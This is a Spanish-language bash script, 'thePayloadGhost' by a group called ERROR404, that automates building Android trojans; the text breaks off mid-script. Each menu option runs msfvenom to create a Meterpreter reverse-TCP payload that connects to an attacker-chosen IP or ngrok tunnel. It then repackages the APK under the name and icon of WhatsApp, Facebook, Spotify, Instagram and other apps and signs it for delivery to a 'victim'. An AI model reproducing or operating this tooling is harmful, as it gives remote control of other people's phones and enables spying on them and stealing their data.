#!/bin/bash
cd /root/Escritorio/
clear
clear
sleep 2
#sleep 3
setterm -foreground yellow
#sleep 5
echo "  ______  __ __    ___  ____    ____  __ __  _       ___    ____  ___     ____  __ __   ___    _____ ______ "
echo " |      T|  T  T  /  _]|    \  /    T|  T  T| T     /   \  /    T|   \   /    T|  T  T /   \  / ___/|      T"
echo " |      ||  l  | /  [_ |  o  )Y  o  ||  |  || |    Y     YY  o  ||    \ Y   __j|  l  |Y     Y(   \_ |      |"
echo " l_j  l_j|  _  |Y    _]|   _/ |     ||  ~  || l___ |  O  ||     ||  D  Y|  T  ||  _  ||  O  | \__  Tl_j  l_j"
echo "   |  |  |  |  ||   [_ |  |   |  _  |l___, ||     T|     ||  _  ||     ||  l_ ||  |  ||     | /  \ |  |  |"
echo "   |  |  |  |  ||     T|  |   |  |  ||     !|     |l     !|  |  ||     ||     ||  |  |l     ! \    |  |  |"
echo "   l__j  l__j__jl_____jl__j   l__j__jl____/ l_____j \___/ l__j__jl_____jl___,_jl__j__j \___/   \___j  l__j"
setterm -foreground red
#sleep 3
echo " by: K                                                                                     error404"
#sleep 5
setterm -foreground white
echo "¿Que quieres?..."
echo " "
setterm -foreground yellow
echo "|[1] WhatsApp     [6] Instagram        |"
echo "|[2] Facebook     [7] Twitter          |"
echo "|[3] Spotify      [8] Netflix          |"
echo "|[4] RepelisPLus  [9] Dialer (Llamadas)|"
echo "|[5] Es-File                           |"
setterm -foreground cyan
echo "           |[0] Salir|"
setterm -foreground red
read -p "Quiero elegir... => " xx
case $xx in
1)
clear
clear
setterm -foreground yellow
#sleep 5
echo "  ______  __ __    ___  ____    ____  __ __  _       ___    ____  ___     ____  __ __   ___    _____ ______ "
echo " |      T|  T  T  /  _]|    \  /    T|  T  T| T     /   \  /    T|   \   /    T|  T  T /   \  / ___/|      T"
echo " |      ||  l  | /  [_ |  o  )Y  o  ||  |  || |    Y     YY  o  ||    \ Y   __j|  l  |Y     Y(   \_ |      |"
echo " l_j  l_j|  _  |Y    _]|   _/ |     ||  ~  || l___ |  O  ||     ||  D  Y|  T  ||  _  ||  O  | \__  Tl_j  l_j"
echo "   |  |  |  |  ||   [_ |  |   |  _  |l___, ||     T|     ||  _  ||     ||  l_ ||  |  ||     | /  \ |  |  |"
echo "   |  |  |  |  ||     T|  |   |  |  ||     !|     |l     !|  |  ||     ||     ||  |  |l     ! \    |  |  |"
echo "   l__j  l__j__jl_____jl__j   l__j__jl____/ l_____j \___/ l__j__jl_____jl___,_jl__j__j \___/   \___j  l__j"
setterm -foreground red
#sleep 3
echo " by: Grupo de Desarrollo ERROR404                                                             "
setterm -foreground cyan
echo ""
echo "              thePayloadGhost              "
setterm -foreground red
echo "==========================================="
echo "| aca podes poner la ip de serveo o ngrok |"
echo "|       Si es que es fuera de red         |"
echo "==========================================="
setterm -foreground cyan
echo "                  error404                 "
echo ""
setterm -foreground white
read -p $"Ingrese su ip = > " ip
read -p $"Ingrese el puerto = > " puerto
read -p $"Nombre de la carpeta = > " nombre
read -p $"Nombre de la APK: " nombre2
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$puerto r > $nombre.apk
apktool d -f $nombre.apk
cd $nombre
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
#
cd res
cd values 
sed -i 's|MainActivity|WhatsApp|g' strings.xml
cd ..
mkdir drawable
cd 
cd /root/Escritorio/ThePayloadGhost/Imagenes/WhatsApp/
cp main_icon.png /root/Escritorio/$nombre/res/drawable/
cd
cd /root/Escritorio/
setterm -foreground green
echo "Aca vamos a tener que compilar todo..."
echo " "
sleep 5
setterm -foreground white
apktool b $nombre -o $nombre2.apk
setterm -foreground green
echo " "
echo "==================================================================="
echo "Una ves ya compilado te pedira una contraseña para la apk." 
echo "Tenes que guardarla para pasos posteriores."
echo "Ahora solo tenes que completar todo los requisitos con datos falsos"
echo "==================================================================="
sleep 5
setterm -foreground white
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $nombre2.apk alias_name
jarsigner -verify -verbose -certs $nombre2.apk
setterm -foreground green
echo "process 100%"
sleep 4
echo " ===================================="
echo "  Ya dispones de una apk para usarla. "  
echo "    con el nombre de victima.apk"
echo " ===================================="
setterm -foreground yellow
sleep 1
clear
echo "================================"
echo "Tu apk se encontrara en la ruta:" 
echo "/root/Escritorio/               "
echo "================================"
cd /root/Escritorio/
rm -rf my-release-key.keystore
rm -rf $nombre.apk
setterm -foreground red
echo " _______  _______  _______  _______  _______     ___    _______      __ "
echo "(8888888\(8888888)(8888888)(8888888)(8888888)   /888)  (8888888)   /888)    "
echo "|8(    \/|8(    )||8(    )||8(   )8||8(    )|  /8/)8|  |8(  )88|  /8/)8|    "
echo "|8(__    |8(____)||8(____)||8|   |8||8(____)| /8(_)8(_ |8| /888| /8(_)8(_   "
echo "|8888)   |8888888)|888888)||8|   |8||888888)|(8888888) |8(/8/)8|(88888888)  "
echo "|8(      |8(\8(   |8(\8(   |8|   |8||8(\8(        )8(  |888/ |8|     )8(    "
echo "|8(____/\|8) \8\__|8) \8\__|8(___)8||8) \8\__     |8|  |88(__)8|     |8|    "
echo "(8888888/|/   \88/|/   \88/(8888888)|8/  \88/     (8)  (8888888)     (8)    "
setterm -foreground white
echo "    by: Grupo de desarrollo ERROR404                                V:0.1"
sleep 2
echo "Redes Sociales:"
echo "Facebook:https://www.facebook.com/error4o4.org"
echo "Instagram:https://www.instagram.com/error404origen/"
echo "TwitterORG:https://twitter.com/error4o4org"
echo "Twitter Origen:https://twitter.com/Error404origen"
echo "Github:https://github.com/error404-notfound"
echo "Paypal:https://www.paypal.me/error404notjavic"
echo "Telegram:https://t.me/joinchat/CSt3sD8YPRMluFt"
echo "Youtube:https://www.youtube.com/error404notfound"
sleep 2
echo ""
;;
2)
setterm -foreground yellow
clear
clear
clear
clear
echo "  ______  __ __    ___  ____    ____  __ __  _       ___    ____  ___     ____  __ __   ___    _____ _____ "
echo " |      T|  T  T  /  _]|    \  /    T|  T  T| T     /   \  /    T|   \   /    T|  T  T /   \  / ___/|      T"
echo " |      ||  l  | /  [_ |  o  )Y  o  ||  |  || |    Y     YY  o  ||    \ Y   __j|  l  |Y     Y(   \_ |      |"
echo " l_j  l_j|  _  |Y    _]|   _/ |     ||  ~  || l___ |  O  ||     ||  D  Y|  T  ||  _  ||  O  | \__  Tl_j  l_j"
echo "   |  |  |  |  ||   [_ |  |   |  _  |l___, ||     T|     ||  _  ||     ||  l_ ||  |  ||     | /  \ |  |  |"
echo "   |  |  |  |  ||     T|  |   |  |  ||     !|     |l     !|  |  ||     ||     ||  |  |l     ! \    |  |  |"
echo "   l__j  l__j__jl_____jl__j   l__j__jl____/ l_____j \___/ l__j__jl_____jl___,_jl__j__j \___/   \___j  l__j"
echo " "
setterm -foreground red
sleep 3
echo "Error404 no se hace responsable del mal uso que le puedas dar"
sleep 3
setterm -foreground cyan
clear
clear
#=================
#INICIO DEL SCRIPT
#=================
echo "automating infection process apk..."
sleep 2
echo "Al ejecutar este script lo creado se"
echo "Guardara en la ruta: /root/Escritorio/"
sleep 6
clear
clear
sleep 2
#======================================================================================
#CREACION Y DESCOMPILACION DE PAYLOAD
#======================================================================================
cd /root/Escritorio/
clear
clear
clear
setterm -foreground cyan
echo "              thePayloadGhost              "
setterm -foreground red
echo "==========================================="
echo "| aca podes poner la ip de serveo o ngrok |"
echo "|       Si es que es fuera de red         |"
echo "==========================================="
setterm -foreground cyan
echo "                  error404                 "
echo ""
setterm -foreground white
read -p $"Ingrese su ip = > " ip
read -p $"Ingrese el puerto = > " puerto
read -p $"Nombre de la carpeta = > " nombre
read -p $"Nombre de la APK: " nombre2
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$puerto R > $nombre.apk
apktool d -f $nombre.apk
cd $nombre
#
#=====================
#USANDO EL COMANDO SED
#=====================
#
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
#
cd res
cd values 
sed -i 's|MainActivity|Facebook|g' strings.xml
cd ..
mkdir drawable
cd 
cd /root/Escritorio/ThePayloadGhost/Imagenes/Facebook/
cp main_icon.png /root/Escritorio/$nombre/res/drawable/
cd
cd /root/Escritorio/
setterm -foreground green
echo "Aca vamos a tener que compilar todo..."
echo " "
sleep 5
setterm -foreground white
apktool b $nombre -o $nombre2.apk
setterm -foreground green
echo " "
echo "==================================================================="
echo "Una ves ya compilado te pedira una contraseña para la apk." 
echo "Tenes que guardarla para pasos posteriores."
echo "Ahora solo tenes que completar todo los requisitos con datos falsos"
echo "==================================================================="
sleep 5
setterm -foreground white
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $nombre2.apk alias_name
jarsigner -verify -verbose -certs $nombre2.apk
setterm -foreground green
echo "process 100%"
sleep 4
echo " ===================================="
echo "  Ya dispones de una apk para usarla. "  
echo "    con el nombre que le diste"
echo " ===================================="
setterm -foreground yellow
sleep 1
clear
echo "================================"
echo "Tu apk se encontrara en la ruta:" 
echo "/root/Escritorio/               "
echo "================================"
cd /root/Escritorio/
rm -rf my-release-key.keystore
rm -rf $nombre.apk
setterm -foreground white
setterm -foreground red
echo " _______  _______  _______  _______  _______     ___    _______      __ "
echo "(8888888\(8888888)(8888888)(8888888)(8888888)   /888)  (8888888)   /888)    "
echo "|8(    \/|8(    )||8(    )||8(   )8||8(    )|  /8/)8|  |8(  )88|  /8/)8|    "
echo "|8(__    |8(____)||8(____)||8|   |8||8(____)| /8(_)8(_ |8| /888| /8(_)8(_   "
echo "|8888)   |8888888)|888888)||8|   |8||888888)|(8888888) |8(/8/)8|(88888888)  "
echo "|8(      |8(\8(   |8(\8(   |8|   |8||8(\8(        )8(  |888/ |8|     )8(    "
echo "|8(____/\|8) \8\__|8) \8\__|8(___)8||8) \8\__     |8|  |88(__)8|     |8|    "
echo "(8888888/|/   \88/|/   \88/(8888888)|8/  \88/     (8)  (8888888)     (8)    "
setterm -foreground white
echo "    by: Desarrollo de ERROR404                                    V:0.1"
sleep 2
echo "Redes Sociales:"
echo "Facebook:https://www.facebook.com/error4o4.org"
echo "Instagram:https://www.instagram.com/error404origen/"
echo "TwitterORG:https://twitter.com/error4o4org"
echo "Twitter Origen:https://twitter.com/Error404origen"
echo "Github:https://github.com/error404-notfound"
echo "Paypal:https://www.paypal.me/error404notjavic"
echo "Telegram:https://t.me/joinchat/CSt3sD8YPRMluFt"
echo "Youtube:https://www.youtube.com/error404notfound"
sleep 2
echo ""
;;
3)
setterm -foreground yellow
clear
clear
clear
clear
echo "  ______  __ __    ___  ____    ____  __ __  _       ___    ____  ___     ____  __ __   ___    _____ _____ "
echo " |      T|  T  T  /  _]|    \  /    T|  T  T| T     /   \  /    T|   \   /    T|  T  T /   \  / ___/|      T"
echo " |      ||  l  | /  [_ |  o  )Y  o  ||  |  || |    Y     YY  o  ||    \ Y   __j|  l  |Y     Y(   \_ |      |"
echo " l_j  l_j|  _  |Y    _]|   _/ |     ||  ~  || l___ |  O  ||     ||  D  Y|  T  ||  _  ||  O  | \__  Tl_j  l_j"
echo "   |  |  |  |  ||   [_ |  |   |  _  |l___, ||     T|     ||  _  ||     ||  l_ ||  |  ||     | /  \ |  |  |"
echo "   |  |  |  |  ||     T|  |   |  |  ||     !|     |l     !|  |  ||     ||     ||  |  |l     ! \    |  |  |"
echo "   l__j  l__j__jl_____jl__j   l__j__jl____/ l_____j \___/ l__j__jl_____jl___,_jl__j__j \___/   \___j  l__j"
echo " "
setterm -foreground red
sleep 3
echo "Error404 no se hace responsable del mal uso que le puedas dar"
sleep 3
setterm -foreground cyan
clear
clear
#=================
#INICIO DEL SCRIPT
#=================
echo "automating infection process apk..."
sleep 2
echo "Al ejecutar este script lo creado se"
echo "Guardara en la ruta: /root/Escritorio/"
sleep 6
clear
clear
sleep 2
clear
clear
clear
sleep 5
sleep 5
#======================================================================================
#CREACION Y DESCOMPILACION DE PAYLOAD
#======================================================================================
cd /root/Escritorio/
clear
clear
clear
setterm -foreground cyan
echo "              thePayloadGhost              "
setterm -foreground red
echo "==========================================="
echo "| aca podes poner la ip de serveo o ngrok |"
echo "|       Si es que es fuera de red         |"
echo "==========================================="
setterm -foreground cyan
echo "                  error404                 "
echo ""
setterm -foreground white
read -p $"Ingrese su ip = > " ip
read -p $"Ingrese el puerto = > " puerto
read -p $"Nombre de la carpeta = > " nombre
read -p $"Nombre de la APK: " nombre2
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$puerto R > $nombre.apk
apktool d -f $nombre.apk
cd $nombre
#
#=====================
#USANDO EL COMANDO SED
#=====================
#
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
#
cd res
cd values 
sed -i 's|MainActivity|Spotify|g' strings.xml
cd ..
mkdir drawable
cd 
cd /root/Escritorio/ThePayloadGhost/Imagenes/Spotify/
cp main_icon.png /root/Escritorio/$nombre/res/drawable/
cd
cd /root/Escritorio/
setterm -foreground green
echo "Aca vamos a tener que compilar todo..."
echo " "
sleep 5
setterm -foreground white
apktool b $nombre -o $nombre2.apk
setterm -foreground green
echo " "
echo "==================================================================="
echo "Una ves ya compilado te pedira una contraseña para la apk." 
echo "Tenes que guardarla para pasos posteriores."
echo "Ahora solo tenes que completar todo los requisitos con datos falsos"
echo "==================================================================="
sleep 5
setterm -foreground white
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $nombre2.apk alias_name
jarsigner -verify -verbose -certs $nombre2.apk
setterm -foreground green
echo "process 100%"
sleep 4
echo " ===================================="
echo "  Ya dispones de una apk para usarla. "  
echo "    con el nombre que le diste"
echo " ===================================="
setterm -foreground yellow
sleep 1
clear
echo "================================"
echo "Tu apk se encontrara en la ruta:" 
echo "/root/Escritorio/               "
echo "================================"
cd /root/Escritorio/
rm -rf my-release-key.keystore
rm -rf $nombre.apk
setterm -foreground white
setterm -foreground red
echo " _______  _______  _______  _______  _______     ___    _______      __ "
echo "(8888888\(8888888)(8888888)(8888888)(8888888)   /888)  (8888888)   /888)    "
echo "|8(    \/|8(    )||8(    )||8(   )8||8(    )|  /8/)8|  |8(  )88|  /8/)8|    "
echo "|8(__    |8(____)||8(____)||8|   |8||8(____)| /8(_)8(_ |8| /888| /8(_)8(_   "
echo "|8888)   |8888888)|888888)||8|   |8||888888)|(8888888) |8(/8/)8|(88888888)  "
echo "|8(      |8(\8(   |8(\8(   |8|   |8||8(\8(        )8(  |888/ |8|     )8(    "
echo "|8(____/\|8) \8\__|8) \8\__|8(___)8||8) \8\__     |8|  |88(__)8|     |8|    "
echo "(8888888/|/   \88/|/   \88/(8888888)|8/  \88/     (8)  (8888888)     (8)    "
setterm -foreground white
echo "    by: Grupo de desarrollo ERROR4044                            V:0.1"
sleep 2
echo "Redes Sociales:"
echo "Facebook:https://www.facebook.com/error4o4.org"
echo "Instagram:https://www.instagram.com/error404origen/"
echo "TwitterORG:https://twitter.com/error4o4org"
echo "Twitter Origen:https://twitter.com/Error404origen"
echo "Github:https://github.com/error404-notfound"
echo "Paypal:https://www.paypal.me/error404notjavic"
echo "Telegram:https://t.me/joinchat/CSt3sD8YPRMluFt"
echo "Youtube:https://www.youtube.com/error404notfound"
sleep 2
echo ""
;;
4)
setterm -foreground yellow
clear
clear
clear
clear
echo "  ______  __ __    ___  ____    ____  __ __  _       ___    ____  ___     ____  __ __   ___    _____ _____ "
echo " |      T|  T  T  /  _]|    \  /    T|  T  T| T     /   \  /    T|   \   /    T|  T  T /   \  / ___/|      T"
echo " |      ||  l  | /  [_ |  o  )Y  o  ||  |  || |    Y     YY  o  ||    \ Y   __j|  l  |Y     Y(   \_ |      |"
echo " l_j  l_j|  _  |Y    _]|   _/ |     ||  ~  || l___ |  O  ||     ||  D  Y|  T  ||  _  ||  O  | \__  Tl_j  l_j"
echo "   |  |  |  |  ||   [_ |  |   |  _  |l___, ||     T|     ||  _  ||     ||  l_ ||  |  ||     | /  \ |  |  |"
echo "   |  |  |  |  ||     T|  |   |  |  ||     !|     |l     !|  |  ||     ||     ||  |  |l     ! \    |  |  |"
echo "   l__j  l__j__jl_____jl__j   l__j__jl____/ l_____j \___/ l__j__jl_____jl___,_jl__j__j \___/   \___j  l__j"
echo " "
setterm -foreground red
sleep 3
echo "Error404 no se hace responsable del mal uso que le puedas dar"
sleep 3
setterm -foreground cyan
clear
clear
#=================
#INICIO DEL SCRIPT
#=================
echo "automating infection process apk..."
sleep 2
echo "Al ejecutar este script lo creado se"
echo "Guardara en la ruta: /root/Escritorio/"
sleep 6
clear
clear
sleep 2
clear
clear
clear
sleep 5
sleep 5
#======================================================================================
#CREACION Y DESCOMPILACION DE PAYLOAD
#======================================================================================
cd /root/Escritorio/
clear
clear
clear
setterm -foreground cyan
echo "              thePayloadGhost              "
setterm -foreground red
echo "==========================================="
echo "| aca podes poner la ip de serveo o ngrok |"
echo "|       Si es que es fuera de red         |"
echo "==========================================="
setterm -foreground cyan
echo "                  error404                 "
echo ""
setterm -foreground white
read -p $"Ingrese su ip = > " ip
read -p $"Ingrese el puerto = > " puerto
read -p $"Nombre de la carpeta = > " nombre
read -p $"Nombre de la APK: " nombre2
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$puerto R > $nombre.apk
apktool d -f $nombre.apk
cd $nombre
#
#=====================
#USANDO EL COMANDO SED
#=====================
#
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
#
cd res
cd values 
sed -i 's|MainActivity|RepelisPLus|g' strings.xml
cd ..
mkdir drawable
cd 
cd /root/Escritorio/ThePayloadGhost/Imagenes/RepelisPlus/
cp main_icon.png /root/Escritorio/$nombre/res/drawable/
cd
cd /root/Escritorio/
setterm -foreground green
echo "Aca vamos a tener que compilar todo..."
echo " "
sleep 5
setterm -foreground white
apktool b $nombre -o $nombre2.apk
setterm -foreground green
echo " "
echo "==================================================================="
echo "Una ves ya compilado te pedira una contraseña para la apk." 
echo "Tenes que guardarla para pasos posteriores."
echo "Ahora solo tenes que completar todo los requisitos con datos falsos"
echo "==================================================================="
sleep 5
setterm -foreground white
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $nombre2.apk alias_name
jarsigner -verify -verbose -certs $nombre2.apk
setterm -foreground green
echo "process 100%"
sleep 4
echo " ===================================="
echo "  Ya dispones de una apk para usarla. "  
echo "    con el nombre que le diste"
echo " ===================================="
setterm -foreground yellow
sleep 1
clear
echo "================================"
echo "Tu apk se encontrara en la ruta:" 
echo "/root/Escritorio/               "
echo "================================"
cd /root/Escritorio/
rm -rf my-release-key.keystore
rm -rf $nombre.apk
setterm -foreground white
setterm -foreground red
echo " _______  _______  _______  _______  _______     ___    _______      __ "
echo "(8888888\(8888888)(8888888)(8888888)(8888888)   /888)  (8888888)   /888)    "
echo "|8(    \/|8(    )||8(    )||8(   )8||8(    )|  /8/)8|  |8(  )88|  /8/)8|    "
echo "|8(__    |8(____)||8(____)||8|   |8||8(____)| /8(_)8(_ |8| /888| /8(_)8(_   "
echo "|8888)   |8888888)|888888)||8|   |8||888888)|(8888888) |8(/8/)8|(88888888)  "
echo "|8(      |8(\8(   |8(\8(   |8|   |8||8(\8(        )8(  |888/ |8|     )8(    "
echo "|8(____/\|8) \8\__|8) \8\__|8(___)8||8) \8\__     |8|  |88(__)8|     |8|    "
echo "(8888888/|/   \88/|/   \88/(8888888)|8/  \88/     (8)  (8888888)     (8)    "
setterm -foreground white
echo "    by: Grupo de desarrollo ERROR404                           V:0.1"
sleep 2
echo "Redes Sociales:"
echo "Facebook:https://www.facebook.com/error4o4.org"
echo "Instagram:https://www.instagram.com/error404origen/"
echo "TwitterORG:https://twitter.com/error4o4org"
echo "Twitter Origen:https://twitter.com/Error404origen"
echo "Github:https://github.com/error404-notfound"
echo "Paypal:https://www.paypal.me/error404notjavic"
echo "Telegram:https://t.me/joinchat/CSt3sD8YPRMluFt"
echo "Youtube:https://www.youtube.com/error404notfound"
sleep 2
echo ""
;;
5)
setterm -foreground yellow
clear
clear
clear
clear
echo "  ______  __ __    ___  ____    ____  __ __  _       ___    ____  ___     ____  __ __   ___    _____ _____ "
echo " |      T|  T  T  /  _]|    \  /    T|  T  T| T     /   \  /    T|   \   /    T|  T  T /   \  / ___/|      T"
echo " |      ||  l  | /  [_ |  o  )Y  o  ||  |  || |    Y     YY  o  ||    \ Y   __j|  l  |Y     Y(   \_ |      |"
echo " l_j  l_j|  _  |Y    _]|   _/ |     ||  ~  || l___ |  O  ||     ||  D  Y|  T  ||  _  ||  O  | \__  Tl_j  l_j"
echo "   |  |  |  |  ||   [_ |  |   |  _  |l___, ||     T|     ||  _  ||     ||  l_ ||  |  ||     | /  \ |  |  |"
echo "   |  |  |  |  ||     T|  |   |  |  ||     !|     |l     !|  |  ||     ||     ||  |  |l     ! \    |  |  |"
echo "   l__j  l__j__jl_____jl__j   l__j__jl____/ l_____j \___/ l__j__jl_____jl___,_jl__j__j \___/   \___j  l__j"
echo " "
setterm -foreground red
sleep 3
echo "Error404 no se hace responsable del mal uso que le puedas dar"
sleep 3
setterm -foreground cyan
clear
clear
#=================
#INICIO DEL SCRIPT
#=================
echo "automating infection process apk..."
sleep 2
echo "Al ejecutar este script lo creado se"
echo "Guardara en la ruta: /root/Escritorio/"
sleep 6
clear
clear
sleep 2
clear
clear
clear
sleep 5
sleep 5
#======================================================================================
#CREACION Y DESCOMPILACION DE PAYLOAD
#======================================================================================
cd /root/Escritorio/
clear
clear
clear
setterm -foreground cyan
echo "              thePayloadGhost              "
setterm -foreground red
echo "==========================================="
echo "| aca podes poner la ip de serveo o ngrok |"
echo "|       Si es que es fuera de red         |"
echo "==========================================="
setterm -foreground cyan
echo "                  error404                 "
echo ""
setterm -foreground white
read -p $"Ingrese su ip = > " ip
read -p $"Ingrese el puerto = > " puerto
read -p $"Nombre de la carpeta = > " nombre
read -p $"Nombre de la APK: " nombre2
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$puerto R > $nombre.apk
apktool d -f $nombre.apk
cd $nombre
#
#=====================
#USANDO EL COMANDO SED
#=====================
#
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
#
cd res
cd values 
sed -i 's|MainActivity|Es-File Explored|g' strings.xml
cd ..
mkdir drawable
cd 
cd /root/Escritorio/ThePayloadGhost/Imagenes/Es-Files/
cp main_icon.png /root/Escritorio/$nombre/res/drawable/
cd
cd /root/Escritorio/
setterm -foreground green
echo "Aca vamos a tener que compilar todo..."
echo " "
sleep 5
setterm -foreground white
apktool b $nombre -o $nombre2.apk
setterm -foreground green
echo " "
echo "==================================================================="
echo "Una ves ya compilado te pedira una contraseña para la apk." 
echo "Tenes que guardarla para pasos posteriores."
echo "Ahora solo tenes que completar todo los requisitos con datos falsos"
echo "==================================================================="
sleep 5
setterm -foreground white
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $nombre2.apk alias_name
jarsigner -verify -verbose -certs $nombre2.apk
setterm -foreground green
echo "process 100%"
sleep 4
echo " ===================================="
echo "  Ya dispones de una apk para usarla. "  
echo "    con el nombre que le diste"
echo " ===================================="
setterm -foreground yellow
sleep 1
clear
echo "================================"
echo "Tu apk se encontrara en la ruta:" 
echo "/root/Escritorio/               "
echo "================================"
cd /root/Escritorio/
rm -rf my-release-key.keystore
rm -rf $nombre.apk
setterm -foreground white
setterm -foreground red
echo " _______  _______  _______  _______  _______     ___    _______      __ "
echo "(8888888\(8888888)(8888888)(8888888)(8888888)   /888)  (8888888)   /888)    "
echo "|8(    \/|8(    )||8(    )||8(   )8||8(    )|  /8/)8|  |8(  )88|  /8/)8|    "
echo "|8(__    |8(____)||8(____)||8|   |8||8(____)| /8(_)8(_ |8| /888| /8(_)8(_   "
echo "|8888)   |8888888)|888888)||8|   |8||888888)|(8888888) |8(/8/)8|(88888888)  "
echo "|8(      |8(\8(   |8(\8(   |8|   |8||8(\8(        )8(  |888/ |8|     )8(    "
echo "|8(____/\|8) \8\__|8) \8\__|8(___)8||8) \8\__     |8|  |88(__)8|     |8|    "
echo "(8888888/|/   \88/|/   \88/(8888888)|8/  \88/     (8)  (8888888)     (8)    "
setterm -foreground white
echo "    by: Grupo de desarrollo                                 V:0.1"
sleep 2
echo "Redes Sociales:"
echo "Facebook:https://www.facebook.com/error4o4.org"
echo "Instagram:https://www.instagram.com/error404origen/"
echo "TwitterORG:https://twitter.com/error4o4org"
echo "Twitter Origen:https://twitter.com/Error404origen"
echo "Github:https://github.com/error404-notfound"
echo "Paypal:https://www.paypal.me/error404notjavic"
echo "Telegram:https://t.me/joinchat/CSt3sD8YPRMluFt"
echo "Youtube:https://www.youtube.com/error404notfound"
sleep 2
echo ""
;;
6)
setterm -foreground yellow
clear
clear
clear
clear
echo "  ______  __ __    ___  ____    ____  __ __  _       ___    ____  ___     ____  __ __   ___    _____ _____ "
echo " |      T|  T  T  /  _]|    \  /    T|  T  T| T     /   \  /    T|   \   /    T|  T  T /   \  / ___/|      T"
echo " |      ||  l  | /  [_ |  o  )Y  o  ||  |  || |    Y     YY  o  ||    \ Y   __j|  l  |Y     Y(   \_ |      |"
echo " l_j  l_j|  _  |Y    _]|   _/ |     ||  ~  || l___ |  O  ||     ||  D  Y|  T  ||  _  ||  O  | \__  Tl_j  l_j"
echo "   |  |  |  |  ||   [_ |  |   |  _  |l___, ||     T|     ||  _  ||     ||  l_ ||  |  ||     | /  \ |  |  |"
echo "   |  |  |  |  ||     T|  |   |  |  ||     !|     |l     !|  |  ||     ||     ||  |  |l     ! \    |  |  |"
echo "   l__j  l__j__jl_____jl__j   l__j__jl____/ l_____j \___/ l__j__jl_____jl___,_jl__j__j \___/   \___j  l__j"
echo " "
setterm -foreground red
sleep 3
echo "Error404 no se hace responsable del mal uso que le puedas dar"
sleep 3
setterm -foreground cyan
clear
clear
#=================
#INICIO DEL SCRIPT
#=================
echo "automating infection process apk..."
sleep 2
echo "Al ejecutar este script lo creado se"
echo "Guardara en la ruta: /root/Escritorio/"
sleep 6
clear
clear
#======================================================================================
#CREACION Y DESCOMPILACION DE PAYLOAD
#======================================================================================
cd /root/Escritorio/
clear
clear
clear
setterm -foreground cyan
echo "              thePayloadGhost              "
setterm -foreground red
echo "==========================================="
echo "| aca podes poner la ip de serveo o ngrok |"
echo "|       Si es que es fuera de red         |"
echo "==========================================="
setterm -foreground cyan
echo "                  error404                 "
echo ""
setterm -foreground white
read -p $"Ingrese su ip = > " ip
read -p $"Ingrese el puerto = > " puerto
read -p $"Nombre de la carpeta = > " nombre
read -p $"Nombre de la APK: " nombre2
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$puerto R > $nombre.apk
apktool d -f $nombre.apk
cd $nombre
#
#=====================
#USANDO EL COMANDO SED
#=====================
#
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
#
cd res
cd values 
sed -i 's|MainActivity|Instagram|g' strings.xml
cd ..
mkdir drawable
cd 
cd /root/Escritorio/ThePayloadGhost/Imagenes/Instagram/
cp main_icon.png /root/Escritorio/$nombre/res/drawable/
cd
cd /root/Escritorio/
setterm -foreground green
echo "Aca vamos a tener que compilar todo..."
echo " "
sleep 5
setterm -foreground white
apktool b $nombre -o $nombre2.apk
setterm -foreground green
echo " "
echo "==================================================================="
echo "Una ves ya compilado te pedira una contraseña para la apk." 
echo "Tenes que guardarla para pasos posteriores."
echo "Ahora solo tenes que completar todo los requisitos con datos falsos"
echo "==================================================================="
sleep 5
setterm -foreground white
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $nombre2.apk alias_name
jarsigner -verify -verbose -certs $nombre2.apk
setterm -foreground green
echo "process 100%"
sleep 4
echo " ===================================="
echo "  Ya dispones de una apk para usarla. "  
echo "    con el nombre que le diste"
echo " ===================================="
setterm -foreground yellow
sleep 1
clear
echo "================================"
echo "Tu apk se encontrara en la ruta:" 
echo "/root/Escritorio/               "
echo "================================"
cd /root/Escritorio/
rm -rf my-release-key.keystore
rm -rf $nombre.apk
setterm -foreground white
setterm -foreground red
echo " _______  _______  _______  _______  _______     ___    _______      __ "
echo "(8888888\(8888888)(8888888)(8888888)(8888888)   /888)  (8888888)   /888)    "
echo "|8(    \/|8(    )||8(    )||8(   )8||8(    )|  /8/)8|  |8(  )88|  /8/)8|    "
echo "|8(__    |8(____)||8(____)||8|   |8||8(____)| /8(_)8(_ |8| /888| /8(_)8(_   "
echo "|8888)   |8888888)|888888)||8|   |8||888888)|(8888888) |8(/8/)8|(88888888)  "
echo "|8(      |8(\8(   |8(\8(   |8|   |8||8(\8(        )8(  |888/ |8|     )8(    "
